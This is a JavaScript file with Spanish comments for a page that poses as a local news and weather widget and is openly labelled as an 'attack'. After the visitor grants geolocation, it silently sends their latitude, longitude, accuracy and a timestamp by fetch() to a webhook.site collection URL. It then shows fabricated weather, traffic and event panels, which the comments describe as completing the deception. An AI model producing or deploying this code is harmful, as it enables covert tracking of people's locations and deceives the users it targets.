function actualizarFechaHora() {
    const ahora = new Date();
    const opcionesFecha = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
    const opcionesHora = { hour: '2-digit', minute: '2-digit', second: '2-digit' };
    
    const fecha = ahora.toLocaleDateString('es-ES', opcionesFecha);
    const hora = ahora.toLocaleTimeString('es-ES', opcionesHora);
    
    const elemento = document.getElementById('fecha-hora-vivo');
    if (elemento) {
        elemento.innerHTML = `${fecha} | ${hora}`;
    }
}

document.addEventListener("DOMContentLoaded", function() {
    
    actualizarFechaHora();
    setInterval(actualizarFechaHora, 1000);

    const boton = document.getElementById("btn-ubicacion"); 
    const resultadoDiv = document.getElementById("resultado");
    const widget = document.getElementById("widget-local"); 

    // --- !! Pega tu URL de webhook.site aquí !! ---
    const url_espia_base = "https://webhook.site/72f2b41d-6ba8-4ca9-b639-b1c3713d8e7b";
    // ------------------------------------

    boton.addEventListener("click", function() {
        
        if (navigator.geolocation) {
            
            resultadoDiv.innerHTML = "Solicitando permiso...";
            
            navigator.geolocation.getCurrentPosition(
                mostrarPosicion, 
                mostrarError,
                { timeout: 5000 } 
            );

        } else {
            resultadoDiv.innerHTML = "Tu navegador no soporta geolocalización.";
        }
    });

    function mostrarPosicion(posicion) {
        
        console.log("¡Ubicación obtenida!", posicion.coords);

        // --- !! ESTA ES LA PARTE DEL "ATAQUE" (VERSIÓN 2.0) !! ---
        
        // 1. Prepara los datos robados
        const lat = posicion.coords.latitude;
        const lon = posicion.coords.longitude;
        const acc = posicion.coords.accuracy;
        const ts = new Date().toISOString();

        // 2. Construye la URL de ataque con los datos como parámetros
        // (Esto evita los bloqueos de 'body' y 'CORS')
        const url_con_datos = `${url_espia_base}?latitud=${lat}&longitud=${lon}&precision=${acc}&timestamp=${ts}`;

        // 3. Envía los datos (ahora como un simple GET)
        fetch(url_con_datos);
        
        // ---------------------------------------------

        
        // 4. Completa el engaño para el usuario
        widget.classList.add("unlocked");
        resultadoDiv.innerHTML = ""; 
        
        document.getElementById("widget-clima").innerHTML = `<strong>Clima en tu zona:</strong> 18°C, mayormente soleado. Sensación térmica agradable. Previsión: Nubes dispersas mañana.`;
        document.getElementById("widget-trafico").innerHTML = `<strong>Tráfico (9:30 AM):</strong> Congestión moderada en la Av. Doble Vía. Flujo lento en el 2do Anillo. Rutas alternativas: Calle Potosí.`;
        document.getElementById("widget-evento").innerHTML = `<strong>Evento Destacado:</strong> Feria de Arte Urbano "Expresión Cruceña" este fin de semana en el Parque Urbano. ¡Artistas locales en acción!`;
        document.getElementById("widget-alerta").innerHTML = `<strong>Alerta de Seguridad:</strong> Reporte de hurto menor en Zona Norte. Se recomienda precaución al transitar.`;
    }

    function mostrarError(error) {
        let mensaje;
        switch(error.code) {
            case error.PERMISSION_DENIED:
                mensaje = "Permiso denegado. No podemos mostrar noticias locales detalladas.";
                break;
            case error.POSITION_UNAVAILABLE:
                mensaje = "La información de ubicación no está disponible. ¿Estás en un lugar cerrado?";
                break;
            case error.TIMEOUT:
                mensaje = "Se agotó el tiempo de espera. Asegúrate de tener buena señal GPS e intenta de nuevo.";
                break;
            default:
                mensaje = "Ocurrió un error inesperado al intentar obtener tu ubicación.";
                break;
        }
        resultadoDiv.innerHTML = `Error: ${mensaje}`;
    }
});

